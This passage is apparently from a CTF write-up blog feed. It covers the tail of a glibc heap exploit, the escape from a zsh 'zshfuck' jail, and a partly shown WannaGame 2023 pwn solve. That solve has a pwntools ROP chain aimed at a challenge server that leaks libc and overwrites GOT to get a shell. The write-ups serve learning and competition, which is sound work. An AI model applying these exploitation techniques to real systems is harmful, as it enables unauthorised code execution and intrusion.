</span></span><span style="display:flex;"><span>elf<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span>  __dso_handle <span style="color:#f92672">-</span> elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;__dso_handle&#39;</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;pie &#39;</span> <span style="color:#f92672">+</span> hex(elf<span style="color:#f92672">.</span>address))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>tcache_perthread_struct <span style="color:#f92672">=</span> heap_page <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x20</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;exception:&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;1 </span><span style="color:#e6db74">{</span>tcache_perthread_struct<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;L&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> io<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1</span>) <span style="color:#f92672">==</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x91</span><span style="color:#e6db74">&#39;</span>:
</span></span><span style="display:flex;"><span>        io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;exception:&#34;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;exception:&#34;</span>)
</span></span><span style="display:flex;"><span>    tcache_perthread_struct <span style="color:#f92672">-=</span> <span style="color:#ae81ff">0x1000</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>heap <span style="color:#f92672">=</span> tcache_perthread_struct <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x8</span>
</span></span><span style="display:flex;"><span>top_chunk <span style="color:#f92672">=</span> heap <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x0ab8</span>
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;heap &#39;</span> <span style="color:#f92672">+</span> hex(heap))
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;top_chunk &#39;</span> <span style="color:#f92672">+</span> hex(top_chunk))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;-3 </span><span style="color:#e6db74">{</span>top_chunk<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;-1 -&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x800</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># cmd = &#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># init-pwndbg</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># b* main+199</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># &#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># gdb.attach(io, cmd)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> aar(top_chunk<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x21ace0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;1 </span><span style="color:#e6db74">{</span>top_chunk<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span><span style="color:#f92672">+</span><span style="color:#ae81ff">6</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;libc &#39;</span> <span style="color:#f92672">+</span> hex(libc<span style="color:#f92672">.</span>address))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>og_offset <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0x50a47</span>, <span style="color:#ae81ff">0xebc81</span>, <span style="color:#ae81ff">0xebc88</span>, <span style="color:#ae81ff">0xebc85</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>stack <span style="color:#f92672">=</span> aar(libc<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>__environ <span style="color:#f92672">-</span> elf<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;data&#39;</span>]) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x21ace0</span>
</span></span><span style="display:flex;"><span>ret <span style="color:#f92672">=</span> stack <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x120</span>
</span></span><span style="display:flex;"><span>rbp <span style="color:#f92672">=</span> ret<span style="color:#f92672">-</span><span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;stack &#39;</span> <span style="color:#f92672">+</span> hex(stack))
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;ret &#39;</span> <span style="color:#f92672">+</span> hex(ret))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;libc_bss&#34;</span>, <span style="color:#e6db74">&#34;rb&#34;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> bytearray(f<span style="color:#f92672">.</span>read())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">## Overwrite rbp with stack address in libc_environ</span>
</span></span><span style="display:flex;"><span>aaw(rbp, libc<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>__environ, <span style="color:#ae81ff">8</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_byte</span>(addr, nth):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> ((addr <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">8</span><span style="color:#f92672">*</span>nth) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>)<span style="color:#f92672">.</span>encode()
</span></span><span style="display:flex;"><span>og <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>address <span style="color:#f92672">+</span> og_offset[<span style="color:#ae81ff">2</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>aaw(libc<span style="color:#f92672">.</span>bss()<span style="color:#f92672">+</span>data<span style="color:#f92672">.</span>find(get_byte(og, <span style="color:#ae81ff">0</span>)), ret, <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>aaw(libc<span style="color:#f92672">.</span>bss()<span style="color:#f92672">+</span>data<span style="color:#f92672">.</span>find(get_byte(og, <span style="color:#ae81ff">1</span>)), ret<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>aaw(libc<span style="color:#f92672">.</span>bss()<span style="color:#f92672">+</span>data<span style="color:#f92672">.</span>find(get_byte(og, <span style="color:#ae81ff">2</span>)), ret<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>clap(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>) <span style="color:#75715e"># win</span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><p>Ở bài này, vì có write primitive ở libc 2.35 khá là mạnh nên mọi người có thể làm nhiều cách khác nhau, mọi người có thể tham khảo ở <a href="https://github.com/nobodyisnobody/docs/tree/main/code.execution.on.last.libc">bài viết này</a></p>
<h1 id="misc---zshfuck">Misc - zshfuck</h1>
<h2 id="source-code-overview-2">Source code overview</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/zsh
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>print -n -P <span style="color:#e6db74">&#34;%F{green}Specify your charset: %f&#34;</span>
</span></span><span style="display:flex;"><span>read -r charset
</span></span><span style="display:flex;"><span><span style="color:#75715e"># get uniq characters in charset</span>
</span></span><span style="display:flex;"><span>charset<span style="color:#f92672">=(</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>(us..)charset<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>banned<span style="color:#f92672">=(</span><span style="color:#e6db74">&#39;*&#39;</span> <span style="color:#e6db74">&#39;?&#39;</span> <span style="color:#e6db74">&#39;`&#39;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> <span style="color:#e6db74">${#</span>charset<span style="color:#e6db74">}</span> -gt <span style="color:#ae81ff">6</span> <span style="color:#f92672">||</span> <span style="color:#e6db74">${#</span>charset:|banned<span style="color:#e6db74">}</span> -ne <span style="color:#e6db74">${#</span>charset<span style="color:#e6db74">}</span> <span style="color:#f92672">]]</span>; <span style="color:#66d9ef">then</span>
</span></span><span style="display:flex;"><span>    print -P <span style="color:#e6db74">&#34;\n%F{red}That&#39;s too easy. Sorry.%f\n&#34;</span>
</span></span><span style="display:flex;"><span>    exit <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">fi</span>
</span></span><span style="display:flex;"><span>print -P <span style="color:#e6db74">&#34;\n%F{green}OK! Got </span>$charset<span style="color:#e6db74">.%f&#34;</span>
</span></span><span style="display:flex;"><span>charset<span style="color:#f92672">+=(</span><span style="color:#e6db74">$&#39;\n&#39;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># start jail via coproc</span>
</span></span><span style="display:flex;"><span>coproc zsh -s
</span></span><span style="display:flex;"><span>exec 3&gt;&amp;p 4&lt;&amp;p
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># read chars from fd 4 (jail stdout), print to stdout</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> IFS<span style="color:#f92672">=</span> read -u4 -r -k1 char; <span style="color:#66d9ef">do</span>
</span></span><span style="display:flex;"><span>    print -u1 -n -- <span style="color:#e6db74">&#34;</span>$char<span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span> &amp;
</span></span><span style="display:flex;"><span><span style="color:#75715e"># read chars from stdin, send to jail stdin if valid</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> IFS<span style="color:#f92672">=</span> read -u0 -r -k1 char; <span style="color:#66d9ef">do</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> ! <span style="color:#e6db74">${#</span>char:|charset<span style="color:#e6db74">}</span> -eq <span style="color:#ae81ff">0</span> <span style="color:#f92672">]]</span>; <span style="color:#66d9ef">then</span>
</span></span><span style="display:flex;"><span>        print -P <span style="color:#e6db74">&#34;\n%F{red}Nope.%f\n&#34;</span>
</span></span><span style="display:flex;"><span>        exit <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">fi</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># send to fd 3 (jail stdin)</span>
</span></span><span style="display:flex;"><span>    print -u3 -n -- <span style="color:#e6db74">&#34;</span>$char<span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span>
</span></span></code></pre></div><h2 id="solution-2">Solution</h2>
<p>Đọc sơ qua thì dường như đây là 1 bài escape jail. Khi mà ta được define 6 kí tự (ngoài  *, ?, `) và sẽ thực thi được command chỉ sử dụng những kí tự mà ta đã define. Vì absolute path của binary <code>getflag</code> khá là dài nên mình sẽ dùng command <code>find .</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">╭─</span> <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#f92672">~/</span>CTF<span style="color:#f92672">/</span>Pwnable<span style="color:#f92672">/</span><span style="color:#ae81ff">2024</span><span style="color:#f92672">/</span>dicectf<span style="color:#f92672">/</span>boogie<span style="color:#f92672">-</span>woogie <span style="color:#960050;background-color:#1e0010"></span>                                                                                                         <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#960050;background-color:#1e0010">✔</span> <span style="color:#960050;background-color:#1e0010"></span> w1n_gl0ry<span style="color:#960050;background-color:#1e0010">@</span>phis1Ng <span style="color:#960050;background-color:#1e0010">─╮</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">╰─</span> nc mc.ax <span style="color:#ae81ff">31774</span>                                                                                                                                                                   <span style="color:#960050;background-color:#1e0010">─╯</span>
</span></span><span style="display:flex;"><span>Specify your charset: find .
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>OK<span style="color:#f92672">!</span> Got f i n d   ..
</span></span><span style="display:flex;"><span>find .
</span></span><span style="display:flex;"><span>.
</span></span><span style="display:flex;"><span>.<span style="color:#f92672">/</span>y0u
</span></span><span style="display:flex;"><span>.<span style="color:#f92672">/</span>y0u<span style="color:#f92672">/</span>w1ll
</span></span><span style="display:flex;"><span>.<span style="color:#f92672">/</span>y0u<span style="color:#f92672">/</span>w1ll<span style="color:#f92672">/</span>n3v3r_g3t
</span></span><span style="display:flex;"><span>.<span style="color:#f92672">/</span>y0u<span style="color:#f92672">/</span>w1ll<span style="color:#f92672">/</span>n3v3r_g3t<span style="color:#f92672">/</span>th1s
</span></span><span style="display:flex;"><span>.<span style="color:#f92672">/</span>y0u<span style="color:#f92672">/</span>w1ll<span style="color:#f92672">/</span>n3v3r_g3t<span style="color:#f92672">/</span>th1s<span style="color:#f92672">/</span>getflag
</span></span><span style="display:flex;"><span>.<span style="color:#f92672">/</span>run
</span></span></code></pre></div><p>Bây giờ, để thực thi được <code>./y0u/w1ll/n3v3r_g3t/th1s/getflag</code> với số kí tự ít ỏi như vậy khá là khoai. Sau 1 hồi, mình tìm thấy tài liệu liên quan đến <a href="https://zsh.sourceforge.io/Doc/Release/Expansion.html#Glob-Operators">zsh</a> và chỉ cần define đúng 5 kí tự <code>./[!]</code> .</p>
<h2 id="final-payload">Final Payload</h2>
<p><img src="https://hackmd.io/_uploads/rJGO1nvop.png" alt="image"></p>
<h1 id="reference">Reference</h1>
<p><a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.27/house_of_einherjar.c">https://github.com/shellphish/how2heap/blob/master/glibc_2.27/house_of_einherjar.c</a></p>
<p><a href="https://wiki.osdev.org/C%2B%2B#GCC">https://wiki.osdev.org/C%2B%2B#GCC</a></p>
<p><a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/stdlib/cxa_finalize.c">https://elixir.bootlin.com/glibc/glibc-2.35/source/stdlib/cxa_finalize.c</a></p>
<p><a href="https://elixir.bootlin.com/linux/latest/source/arch/x86/kernel/process.c">https://elixir.bootlin.com/linux/latest/source/arch/x86/kernel/process.c</a></p>
<p><a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L2547">https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L2547</a></p>
<p><a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L4420">https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L4420</a></p>
<p><a href="https://zsh.sourceforge.io/Doc/Release/Expansion.html#Glob-Operators">https://zsh.sourceforge.io/Doc/Release/Expansion.html#Glob-Operators</a></p>
]]></description>
      
    </item>
    
    
    
    <item>
      <title>0CTF/TCTF 2023 Writeups</title>
      <link>https://w1n-gl0ry.github.io/posts/0ctf-tctf/</link>
      <pubDate>Tue, 12 Dec 2023 17:37:11 +0800</pubDate>
      
      <guid>https://w1n-gl0ry.github.io/posts/0ctf-tctf/</guid>
      <description><![CDATA[<p>under maintenance</p>
]]></description>
      
    </item>
    
    
    
    <item>
      <title>WannaGame ChampionShip 2023 Writeups</title>
      <link>https://w1n-gl0ry.github.io/posts/wc-2023/</link>
      <pubDate>Mon, 04 Dec 2023 17:37:11 +0800</pubDate>
      
      <guid>https://w1n-gl0ry.github.io/posts/wc-2023/</guid>
      <description><![CDATA[<h1 id="introduction">Introduction</h1>
<p>This past weekend, I played the WannaGame Championship CTF with my team 1337% Yogurt and we finished in the top 8 Global and top 2 in my University. Through this, I have managed to solve 2/2 pwn challenge <code>winner_of_all_time</code> and <code>serendipity</code>.</p>
<h1 id="1-winner-of-all-time">1. Winner of all time</h1>
<h2 id="overview">Overview</h2>
<p><img src="https://hackmd.io/_uploads/S10id2EIa.png" alt="image"></p>
<h2 id="analysis">Analysis</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> a1, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>a2, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>a3)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> v3; <span style="color:#75715e">// eax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v4; <span style="color:#75715e">// rdi
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v5; <span style="color:#75715e">// ebx
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v7[<span style="color:#ae81ff">21</span>]; <span style="color:#75715e">// [rsp+0h] [rbp-B0h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  v3 <span style="color:#f92672">=</span> time(<span style="color:#ae81ff">0LL</span>);
</span></span><span style="display:flex;"><span>  v4 <span style="color:#f92672">=</span> v3;
</span></span><span style="display:flex;"><span>  srand(v3);
</span></span><span style="display:flex;"><span>  magic <span style="color:#f92672">=</span> rand() <span style="color:#f92672">%</span> <span style="color:#ae81ff">123456789</span>;
</span></span><span style="display:flex;"><span>  set_up(v4, a2);
</span></span><span style="display:flex;"><span>  banner();
</span></span><span style="display:flex;"><span>  puts(<span style="color:#e6db74">&#34;What time do you want to be back?&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> ( <span style="color:#ae81ff">1</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;Timeline number [%d]: &#34;</span>, (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)idc);
</span></span><span style="display:flex;"><span>    v5 <span style="color:#f92672">=</span> idc;
</span></span><span style="display:flex;"><span>    v7[v5] <span style="color:#f92672">=</span> get_int();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( v7[idc] <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">123456790</span> )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      puts(<span style="color:#e6db74">&#34;TVA: you commit the crime of time!!!&#34;</span>);
</span></span><span style="display:flex;"><span>      exit(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( v7[idc] <span style="color:#f92672">==</span> magic )
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">++</span>idc;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  puts(<span style="color:#e6db74">&#34;Welcome to sanctuary of time&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0LL</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>The <code>v7</code> array has only 21 members, but the while loop doesn&rsquo;t break if the <code>idx</code> variable exceeds 21. This means we can easily create a ROP chain and use the predictable &lsquo;magic&rsquo; to break out of the while loop.</p>
<pre tabindex="0"><code>import ctypes
LIBC = ctypes.cdll.LoadLibrary(&#39;/path/to/dll&#39;)
LIBC.srand(LIBC.time(0))
</code></pre><p>I use this trick to bypass the check for the magic value.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( v7[idc] <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">123456790</span> )
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>      puts(<span style="color:#e6db74">&#34;TVA: you commit the crime of time!!!&#34;</span>);
</span></span><span style="display:flex;"><span>      exit(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Due to this check, it&rsquo;s not easy to create a normal rop chain with the large address in libc. So, I managed to leak libc and use <code>scanf(&quot;%lld&quot;, &lt;got_addr&gt;)</code> to get shell!!!</p>
<h2 id="exploit-script">Exploit script</h2>
<blockquote>
<p>solve.py</p>
</blockquote>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> ctypes <span style="color:#f92672">import</span><span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>LOCAL:
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">=</span>process(<span style="color:#e6db74">&#39;./winner_of_all_time&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>GDB:
</span></span><span style="display:flex;"><span>        cmd<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        init-pwndbg
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        b* 0x0000000000401589
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>        gdb<span style="color:#f92672">.</span>attach(io, cmd)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">=</span>remote(<span style="color:#e6db74">&#39;157.245.147.89&#39;</span>, <span style="color:#ae81ff">25174</span>)
</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">=</span>ELF(<span style="color:#e6db74">&#39;./libc.so.6&#39;</span>)
</span></span><span style="display:flex;"><span>elf<span style="color:#f92672">=</span>context<span style="color:#f92672">.</span>binary<span style="color:#f92672">=</span>ELF(<span style="color:#e6db74">&#39;./winner_of_all_time&#39;</span>)        
</span></span><span style="display:flex;"><span>glibc <span style="color:#f92672">=</span> cdll<span style="color:#f92672">.</span>LoadLibrary(<span style="color:#e6db74">&#39;./libc.so.6&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pop_rdi<span style="color:#f92672">=</span><span style="color:#ae81ff">0x0000000000401589</span>
</span></span><span style="display:flex;"><span>pop_rsi_r15<span style="color:#f92672">=</span><span style="color:#ae81ff">0x0000000000401596</span>
</span></span><span style="display:flex;"><span>ret<span style="color:#f92672">=</span><span style="color:#ae81ff">0x000000000040101a</span>
</span></span><span style="display:flex;"><span>pop_rbp_ret<span style="color:#f92672">=</span><span style="color:#ae81ff">0x000000000040133e</span>
</span></span><span style="display:flex;"><span>leave_ret<span style="color:#f92672">=</span><span style="color:#ae81ff">0x00000000004013ac</span>
</span></span><span style="display:flex;"><span>glibc<span style="color:#f92672">.</span>srand(glibc<span style="color:#f92672">.</span>time(<span style="color:#66d9ef">None</span>))
</span></span><span style="display:flex;"><span>magic <span style="color:#f92672">=</span> glibc<span style="color:#f92672">.</span>rand() <span style="color:#f92672">%</span> <span style="color:#ae81ff">123456789</span>
</span></span><span style="display:flex;"><span>print(magic)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">22</span>):
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(str(<span style="color:#ae81ff">10</span>)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>rbp<span style="color:#f92672">=</span><span style="color:#ae81ff">0x404b00</span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(str(rbp)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>add_nop_ret<span style="color:#f92672">=</span><span style="color:#ae81ff">0x000000000040127c</span>
</span></span><span style="display:flex;"><span>mov_rbx<span style="color:#f92672">=</span><span style="color:#ae81ff">0x00000000004013a8</span>
</span></span><span style="display:flex;"><span>scanf<span style="color:#f92672">=</span><span style="color:#ae81ff">0x404060</span>
</span></span><span style="display:flex;"><span>d<span style="color:#f92672">=</span><span style="color:#ae81ff">0x000000000040270F</span>
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">=</span>p64(pop_rdi)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(elf<span style="color:#f92672">.</span>got<span style="color:#f92672">.</span>puts)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(elf<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>puts)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(ret)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(pop_rdi)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(d)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(pop_rsi_r15)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(<span style="color:#ae81ff">0x404f00</span>)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(<span style="color:#ae81ff">0x000000000401180</span>)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(ret)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(pop_rdi)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(d)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(pop_rsi_r15)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(<span style="color:#ae81ff">0x404018</span>)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(ret)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(<span style="color:#ae81ff">0x000000000401180</span>)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(pop_rdi)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(<span style="color:#ae81ff">0x404f00</span>)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(ret)
